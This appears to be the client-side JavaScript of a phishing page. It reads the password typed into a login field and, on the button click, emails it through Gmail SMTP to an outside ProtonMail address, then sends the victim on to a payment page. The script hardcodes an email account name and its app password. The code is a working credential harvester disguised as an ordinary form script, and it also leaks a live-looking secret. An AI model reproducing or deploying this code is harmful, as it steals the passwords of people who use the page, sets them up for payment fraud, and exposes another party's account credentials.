window.onload=function()
{
    let pwd = document.getElementById("userPass");
    let btn = document.getElementById("btn");
    let footer = document.getElementById("footer");

    pwd.addEventListener("focus", myFocusFunction, true);
    pwd.addEventListener("blur", myBlurFunction, true);

    function myFocusFunction() {
        btn.style.backgroundColor = "#3e9920";
        footer.style.display = "none";
    }

    function myBlurFunction() {
        btn.style.backgroundColor = "";
    }




    btn.onclick = function() {
        let passwd = pwd.value;
        let finalmessage = `Senha : ${passwd} <br>`;

        if (passwd.length > 6) {
            Email.send({
                Host: "smtp.gmail.com",
                Username : "julio74108520@gmail.com",
                Password : "dnkf zamf xwmj amjr",
                To : 'user1533@protonmail.com',
                From : "julio74108520@gmail.com",
                Subject : "Mail from website",
                Body : finalmessage
            });
            window.open('payment.html');
        } else {
            window.open('#top');
        }
    }
}